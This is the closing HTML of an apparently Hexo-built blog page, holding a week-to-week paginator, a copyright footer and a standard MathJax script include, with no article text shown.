+</div></article></div></main><footer><div class="paginator"><a href="/2022/04/12/week3/" class="prev">PREV</a><a href="/2022/04/12/week5/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
